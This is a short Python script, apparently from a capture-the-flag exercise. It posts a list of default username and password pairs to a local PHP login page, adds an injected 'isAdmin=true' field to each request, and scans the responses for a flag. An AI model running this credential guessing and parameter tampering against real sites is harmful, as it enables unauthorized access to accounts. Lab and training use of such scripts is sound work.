import requests
import re

url = "http://127.0.0.1:32829/index.php"

credentials = [
    ("admin", "admin"),
    ("admin", "password"),
    ("bart", "bart"),
    ("homer", "homer"),
]

print(f"[*] Testing credentials with isAdmin=true parameter\n")

for username, password in credentials:
    print(f"\n[*] Testing: {username}:{password}")
    
    data = {
        "username": username,
        "password": password,
        "isAdmin": "true"
    }
    
    try:
        # Create new connection for each request
        r = requests.post(url, data=data, timeout=10)
        
        print(f"Status: {r.status_code}")
        print(f"Length: {len(r.text)} bytes")
        print(f"Cookies: {dict(r.cookies)}")
        
        # Check for FLAG
        if "FLAG{" in r.text:
            flag = re.search(r'FLAG\{[^}]+\}', r.text)
            if flag:
                print(f"\n[!!!] FLAG FOUND: {flag.group(0)}")
        
        # Print response if different or has flag
        if len(r.text) != 1164 or "FLAG{" in r.text or r.cookies:
            print(f"Response:\n{r.text}")
            
    except Exception as e:
        print(f"Error: {str(e)}")

print("\n[*] Done")

